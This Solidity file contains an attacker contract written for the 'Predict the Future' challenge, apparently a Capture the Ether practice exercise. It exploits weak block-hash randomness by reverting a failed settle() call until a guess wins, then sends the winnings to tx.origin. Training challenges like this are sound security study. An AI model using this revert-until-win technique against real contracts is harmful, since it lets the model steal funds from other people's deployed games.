/**
 *Submitted for verification at Etherscan.io on 2021-03-05
*/

pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    function lockInGuess(uint8 n) external payable {
        // need to call it from this contract because guesser is stored and checked
        // when settling
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();

        // if we guessed wrong, revert
        require(challenge.isComplete(), "challenge not completed");
        // return all of it to EOA
        tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}